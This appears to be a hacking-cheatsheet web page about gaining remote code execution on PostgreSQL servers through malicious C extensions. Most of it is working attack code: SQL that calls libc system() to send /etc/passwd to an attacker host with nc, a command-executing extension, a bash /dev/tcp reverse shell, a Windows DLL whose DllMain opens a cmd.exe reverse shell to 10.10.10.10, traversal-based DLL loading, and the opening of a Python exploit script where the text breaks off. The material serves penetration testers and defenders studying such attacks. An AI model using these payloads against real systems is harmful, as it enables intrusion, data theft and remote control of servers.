<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> RCE with PostgreSQL Extensions | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/hacking/cheetsheets/sql-injection/postgresql-injection/rce-with-postgresql-extensions/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">bl0g </a> </li> <li class="nav-item active"> <a class="nav-link" href="/hacking/">h4ck1ng <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/misc/">m15c </a> </li> <li class="nav-item "> <a class="nav-link" href="/repos/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/Cheetsheets/">Cheetsheets</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">RCE with PostgreSQL Extensions</h1> <p class="post-description"></p> </header> <article> <h1 id="rce-with-postgresql-extensions">RCE with PostgreSQL Extensions</h1> <h2 id="postgresql-extensions">PostgreSQL Extensions</h2> <p>PostgreSQL has been developed with extensibility as a core feature, allowing it to seamlessly integrate extensions as if they were built-in functionalities. These extensions, essentially libraries written in C, enrich the database with additional functions, operators, or types.</p> <p>From version 8.1 onwards, a specific requirement is imposed on the extension libraries: they must be compiled with a special header. Without this, PostgreSQL will not execute them, ensuring only compatible and potentially secure extensions are used.</p> <p>Also, keep in mind that <strong>if you don’t know how to</strong> <a href="big-binary-files-upload-postgresql.md"><strong>upload files to the victim abusing PostgreSQL you should read this post.</strong></a></p> <h3 id="rce-in-linux">RCE in Linux</h3> <p><strong>For more information check: <a href="https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/">https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/</a></strong></p> <p>The execution of system commands from PostgreSQL 8.1 and earlier versions is a process that has been clearly documented and is straightforward. It’s possible to use this: <a href="https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload">Metasploit module</a>.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">OR</span> <span class="k">REPLACE</span> <span class="k">FUNCTION</span> <span class="k">system</span> <span class="p">(</span><span class="n">cstring</span><span class="p">)</span> <span class="k">RETURNS</span> <span class="nb">integer</span> <span class="k">AS</span> <span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">,</span> <span class="s1">'system'</span> <span class="k">LANGUAGE</span> <span class="s1">'c'</span> <span class="k">STRICT</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="k">system</span><span class="p">(</span><span class="s1">'cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;'</span><span class="p">);</span>

<span class="o">#</span> <span class="n">You</span> <span class="n">can</span> <span class="n">also</span> <span class="k">create</span> <span class="n">functions</span> <span class="k">to</span> <span class="k">open</span> <span class="k">and</span> <span class="k">write</span> <span class="n">files</span>
<span class="k">CREATE</span> <span class="k">OR</span> <span class="k">REPLACE</span> <span class="k">FUNCTION</span> <span class="k">open</span><span class="p">(</span><span class="n">cstring</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="k">RETURNS</span> <span class="nb">int</span> <span class="k">AS</span> <span class="s1">'/lib/libc.so.6'</span><span class="p">,</span> <span class="s1">'open'</span> <span class="k">LANGUAGE</span> <span class="s1">'C'</span> <span class="k">STRICT</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">OR</span> <span class="k">REPLACE</span> <span class="k">FUNCTION</span> <span class="k">write</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">cstring</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="k">RETURNS</span> <span class="nb">int</span> <span class="k">AS</span> <span class="s1">'/lib/libc.so.6'</span><span class="p">,</span> <span class="s1">'write'</span> <span class="k">LANGUAGE</span> <span class="s1">'C'</span> <span class="k">STRICT</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">OR</span> <span class="k">REPLACE</span> <span class="k">FUNCTION</span> <span class="k">close</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span> <span class="k">RETURNS</span> <span class="nb">int</span> <span class="k">AS</span> <span class="s1">'/lib/libc.so.6'</span><span class="p">,</span> <span class="s1">'close'</span> <span class="k">LANGUAGE</span> <span class="s1">'C'</span> <span class="k">STRICT</span><span class="p">;</span>
</code></pre></div></div> <details> <summary>Write binary file from base64</summary> To write a binary into a file in postgres you might need to use base64, this will be helpful for that matter: ```sql CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS $$ DECLARE fh int; s int; w bytea; i int; BEGIN SELECT open(textout(file)::cstring, 522, 448) INTO fh; IF fh &lt;= 2 THEN RETURN 1; END IF; SELECT decode(s, 'base64') INTO w; i := 0; LOOP EXIT WHEN i &gt;= octet_length(w); SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs; IF rs &lt; 0 THEN RETURN 2; END IF; i := i + 1; END LOOP; SELECT close(fh) INTO rs; RETURN 0; END; $$ LANGUAGE 'plpgsql'; ``` </details> <p>However, when attempted on greater versions <strong>the following error was shown</strong>:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">ERROR:</span>  <span class="n">incompatible</span> <span class="n">library</span> <span class="err">“</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">”</span><span class="o">:</span> <span class="n">missing</span> <span class="n">magic</span> <span class="n">block</span>
<span class="n">HINT</span><span class="o">:</span>  <span class="n">Extension</span> <span class="n">libraries</span> <span class="n">are</span> <span class="n">required</span> <span class="n">to</span> <span class="n">use</span> <span class="n">the</span> <span class="n">PG_MODULE_MAGIC</span> <span class="n">macro</span><span class="p">.</span>
</code></pre></div></div> <p>This error is explained in the <a href="https://www.postgresql.org/docs/current/static/xfunc-c.html">PostgreSQL documentation</a>:</p> <blockquote> <p>To ensure that a dynamically loaded object file is not loaded into an incompatible server, PostgreSQL checks that the file contains a “magic block” with the appropriate contents. This allows the server to detect obvious incompatibilities, such as code compiled for a different major version of PostgreSQL. A magic block is required as of PostgreSQL 8.2. To include a magic block, write this in one (and only one) of the module source files, after having included the header fmgr.h:</p> <p><code class="language-plaintext highlighter-rouge">#ifdef PG_MODULE_MAGIC</code><br/> <code class="language-plaintext highlighter-rouge">PG_MODULE_MAGIC;</code><br/> <code class="language-plaintext highlighter-rouge">#endif</code></p> </blockquote> <p>Since PostgreSQL version 8.2, the process for an attacker to exploit the system has been made more challenging. The attacker is required to either utilize a library that is already present on the system or to upload a custom library. This custom library must be compiled against the compatible major version of PostgreSQL and must include a specific “magic block”. This measure significantly increases the difficulty of exploiting PostgreSQL systems, as it necessitates a deeper understanding of the system’s architecture and version compatibility.</p> <h4 id="compile-the-library">Compile the library</h4> <p>Get the PsotgreSQL version with:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">version</span><span class="p">();</span>
<span class="n">PostgreSQL</span> <span class="mi">9</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">3</span> <span class="k">on</span> <span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="p">,</span> <span class="n">compiled</span> <span class="k">by</span> <span class="n">gcc</span> <span class="p">(</span><span class="n">Debian</span> <span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">18</span><span class="p">)</span> <span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span> <span class="mi">20170516</span><span class="p">,</span> <span class="mi">64</span><span class="o">-</span><span class="nb">bit</span>
</code></pre></div></div> <p>For compatibility, it is essential that the major versions align. Therefore, compiling a library with any version within the 9.6.x series should ensure successful integration.</p> <p>To install that version in your system:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>postgresql postgresql-server-dev-9.6
</code></pre></div></div> <p>And compile the library:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c</span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"postgres.h"</span><span class="cp">
#include</span> <span class="cpf">"fmgr.h"</span><span class="cp">
</span>
<span class="cp">#ifdef PG_MODULE_MAGIC
</span><span class="n">PG_MODULE_MAGIC</span><span class="p">;</span>
<span class="cp">#endif
</span>
<span class="n">PG_FUNCTION_INFO_V1</span><span class="p">(</span><span class="n">pg_exec</span><span class="p">);</span>
<span class="n">Datum</span> <span class="nf">pg_exec</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">command</span> <span class="o">=</span> <span class="n">PG_GETARG_CSTRING</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">PG_RETURN_INT32</span><span class="p">(</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div> <p>Then upload the compiled library and execute commands with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE FUNCTION sys<span class="o">(</span>cstring<span class="o">)</span> RETURNS int AS <span class="s1">'/tmp/pg_exec.so'</span>, <span class="s1">'pg_exec'</span> LANGUAGE C STRICT<span class="p">;</span>
SELECT sys<span class="o">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1"'</span><span class="o">)</span><span class="p">;</span>
<span class="c">#Notice the double single quotes are needed to scape the qoutes</span>
</code></pre></div></div> <p>You can find this <strong>library precompiled</strong> to several different PostgreSQL versions and even can <strong>automate this process</strong> (if you have PostgreSQL access) with:</p> <p>https://github.com/Dionach/pgexec</p> <h3 id="rce-in-windows">RCE in Windows</h3> <p>The following DLL takes as input the <strong>name of the binary</strong> and the <strong>number</strong> of <strong>times</strong> you want to execute it and executes it:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"postgres.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"fmgr.h"</span><span class="cp">
#include</span> <span class="cpf">"utils/geo_decls.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"utils/builtins.h"</span><span class="cp">
</span>
<span class="cp">#ifdef PG_MODULE_MAGIC
</span><span class="n">PG_MODULE_MAGIC</span><span class="p">;</span>
<span class="cp">#endif
</span>
<span class="cm">/* Add a prototype marked PGDLLEXPORT */</span>
<span class="n">PGDLLEXPORT</span> <span class="n">Datum</span> <span class="nf">pgsql_exec</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">);</span>
<span class="n">PG_FUNCTION_INFO_V1</span><span class="p">(</span><span class="n">pgsql_exec</span><span class="p">);</span>

<span class="cm">/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/</span>
<span class="n">Datum</span>
<span class="nf">pgsql_exec</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">)</span>
<span class="p">{</span>
	<span class="cm">/* convert text pointer to C string */</span>
<span class="cp">#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
</span>
	<span class="cm">/* retrieve the second argument that is passed to the function (an integer)
	that will serve as our counter limit*/</span>

	<span class="kt">int</span> <span class="n">instances</span> <span class="o">=</span> <span class="n">PG_GETARG_INT32</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="n">instances</span><span class="p">;</span> <span class="n">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="cm">/*launch the process passed in the first parameter*/</span>
		<span class="n">ShellExecute</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"open"</span><span class="p">,</span> <span class="n">GET_STR</span><span class="p">(</span><span class="n">PG_GETARG_TEXT_P</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">PG_RETURN_VOID</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div> <p>You can find the DLL compiled in this zip:</p> <p>pgsql_exec.zip</p> <p>You can indicate to this DLL <strong>which binary to execute</strong> and the number of time to execute it, in this example it will execute <code class="language-plaintext highlighter-rouge">calc.exe</code> 2 times:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE OR REPLACE FUNCTION remote_exec<span class="o">(</span>text, integer<span class="o">)</span> RETURNS void AS <span class="s1">'\\10.10.10.10\shared\pgsql_exec.dll'</span>, <span class="s1">'pgsql_exec'</span> LANGUAGE C STRICT<span class="p">;</span>
SELECT remote_exec<span class="o">(</span><span class="s1">'calc.exe'</span>, 2<span class="o">)</span><span class="p">;</span>
DROP FUNCTION remote_exec<span class="o">(</span>text, integer<span class="o">)</span><span class="p">;</span>
</code></pre></div></div> <p>In <a href="https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html"><strong>here</strong> </a>you can find this reverse-shell:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"
</span>
<span class="cp">#include</span> <span class="cpf">"postgres.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"fmgr.h"</span><span class="cp">
#include</span> <span class="cpf">"utils/geo_decls.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;winsock2.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment(lib,"ws2_32")
</span>
<span class="cp">#ifdef PG_MODULE_MAGIC
</span><span class="n">PG_MODULE_MAGIC</span><span class="p">;</span>
<span class="cp">#endif
</span>
<span class="cp">#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS
</span>
<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">_In_</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span>
                    <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span>
                    <span class="n">_In_</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">WSADATA</span> <span class="n">wsaData</span><span class="p">;</span>
    <span class="n">SOCKET</span> <span class="n">wsock</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">ip_addr</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="n">STARTUPINFOA</span> <span class="n">startupinfo</span><span class="p">;</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">processinfo</span><span class="p">;</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">program</span> <span class="o">=</span> <span class="s">"cmd.exe"</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ip</span> <span class="o">=</span> <span class="n">PG_REVSHELL_CALLHOME_SERVER</span><span class="p">;</span>
    <span class="n">u_short</span> <span class="n">port</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">PG_REVSHELL_CALLHOME_PORT</span><span class="p">);</span>

    <span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">wsaData</span><span class="p">);</span>
    <span class="n">wsock</span> <span class="o">=</span> <span class="n">WSASocket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span>
                      <span class="n">IPPROTO_TCP</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">ip</span><span class="p">);</span>
    <span class="n">strcpy_s</span><span class="p">(</span><span class="n">ip_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ip_addr</span><span class="p">),</span>
             <span class="n">inet_ntoa</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="k">struct</span> <span class="n">in_addr</span> <span class="o">*</span><span class="p">)</span><span class="n">host</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">)));</span>

    <span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">ip_addr</span><span class="p">);</span>

    <span class="n">WSAConnect</span><span class="p">(</span><span class="n">wsock</span><span class="p">,</span> <span class="p">(</span><span class="n">SOCKADDR</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server</span><span class="p">),</span>
              <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">startupinfo</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">startupinfo</span><span class="p">));</span>
    <span class="n">startupinfo</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">startupinfo</span><span class="p">);</span>
    <span class="n">startupinfo</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESTDHANDLES</span><span class="p">;</span>
    <span class="n">startupinfo</span><span class="p">.</span><span class="n">hStdInput</span> <span class="o">=</span> <span class="n">startupinfo</span><span class="p">.</span><span class="n">hStdOutput</span> <span class="o">=</span>
                            <span class="n">startupinfo</span><span class="p">.</span><span class="n">hStdError</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">wsock</span><span class="p">;</span>

    <span class="n">CreateProcessA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">program</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
                  <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">startupinfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">processinfo</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">#pragma warning(pop) </span><span class="cm">/* re-enable 4996 */</span><span class="cp">
</span>
<span class="cm">/* Add a prototype marked PGDLLEXPORT */</span>
<span class="n">PGDLLEXPORT</span> <span class="n">Datum</span> <span class="nf">dummy_function</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">);</span>

<span class="n">PG_FUNCTION_INFO_V1</span><span class="p">(</span><span class="n">add_one</span><span class="p">);</span>

<span class="n">Datum</span> <span class="nf">dummy_function</span><span class="p">(</span><span class="n">PG_FUNCTION_ARGS</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">int32</span> <span class="n">arg</span> <span class="o">=</span> <span class="n">PG_GETARG_INT32</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="n">PG_RETURN_INT32</span><span class="p">(</span><span class="n">arg</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>Note how in this case the <strong>malicious code is inside the DllMain function</strong>. This means that in this case it isn’t necessary to execute the loaded function in postgresql, just <strong>loading the DLL</strong> will <strong>execute</strong> the reverse shell:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CREATE</span> <span class="n">OR</span> <span class="n">REPLACE</span> <span class="n">FUNCTION</span> <span class="n">dummy_function</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">RETURNS</span> <span class="kt">int</span> <span class="n">AS</span> <span class="err">'\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="err">\</span><span class="n">shared</span><span class="err">\</span><span class="n">dummy_function</span><span class="p">.</span><span class="n">dll</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">dummy_function</span><span class="err">'</span> <span class="n">LANGUAGE</span> <span class="n">C</span> <span class="n">STRICT</span><span class="p">;</span>
</code></pre></div></div> <p>The <a href="https://github.com/rop-la/PolyUDF">PolyUDF project</a> is also a good starting point with the full MS Visual Studio project and a ready to use library (including: <em>command eval</em>, <em>exec</em> and <em>cleanup</em>) with multiversion support.</p> <h3 id="rce-in-newest-prostgres-versions">RCE in newest Prostgres versions</h3> <p>In the <strong>latest versions</strong> of PostgreSQL, restrictions have been imposed where the <code class="language-plaintext highlighter-rouge">superuser</code> is <strong>prohibited</strong> from <strong>loading</strong> shared library files except from specific directories, such as <code class="language-plaintext highlighter-rouge">C:\Program Files\PostgreSQL\11\lib</code> on Windows or <code class="language-plaintext highlighter-rouge">/var/lib/postgresql/11/lib</code> on *nix systems. These directories are <strong>secured</strong> against write operations by either the NETWORK_SERVICE or postgres accounts.</p> <p>Despite these restrictions, it’s possible for an authenticated database <code class="language-plaintext highlighter-rouge">superuser</code> to <strong>write binary files</strong> to the filesystem using “large objects.” This capability extends to writing within the <code class="language-plaintext highlighter-rouge">C:\Program Files\PostgreSQL\11\data</code> directory, which is essential for database operations like updating or creating tables.</p> <p>A significant vulnerability arises from the <code class="language-plaintext highlighter-rouge">CREATE FUNCTION</code> command, which <strong>permits directory traversal</strong> into the data directory. Consequently, an authenticated attacker could <strong>exploit this traversal</strong> to write a shared library file into the data directory and then <strong>load it</strong>. This exploit enables the attacker to execute arbitrary code, achieving native code execution on the system.</p> <h4 id="attack-flow">Attack flow</h4> <p>First of all you need to <strong>use large objects to upload the dll</strong>. You can see how to do that here:</p> <p>big-binary-files-upload-postgresql.md</p> <p>Once you have uploaded the extension (with the name of poc.dll for this example) to the data directory you can load it with:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">create</span> <span class="n">function</span> <span class="n">connect_back</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">integer</span><span class="p">)</span> <span class="n">returns</span> <span class="kt">void</span> <span class="n">as</span> <span class="err">'</span><span class="p">..</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">poc</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">connect_back</span><span class="err">'</span> <span class="n">language</span> <span class="n">C</span> <span class="n">strict</span><span class="p">;</span>
<span class="n">select</span> <span class="nf">connect_back</span><span class="p">(</span><span class="err">'</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">100</span><span class="p">.</span><span class="mi">54</span><span class="err">'</span><span class="p">,</span> <span class="mi">1234</span><span class="p">);</span>
</code></pre></div></div> <p><em>Note that you don’t need to append the <code class="language-plaintext highlighter-rouge">.dll</code> extension as the create function will add it.</em></p> <p>For more information <strong>read the</strong><a href="https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html"> <strong>original publication here</strong></a><strong>.</strong><br/> In that publication <strong>this was the</strong> <a href="https://github.com/sourceincite/tools/blob/master/pgpwn.c"><strong>code use to generate the postgres extension</strong></a> (<em>to learn how to compile a postgres extension read any of the previous versions</em>).<br/> In the same page this <strong>exploit to automate</strong> this technique was given:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">sys</span>

<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) usage %s &lt;connectback&gt; &lt;port&gt; &lt;dll/so&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) eg: %s 192.168.100.54 1234 si-x64-12.dll</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
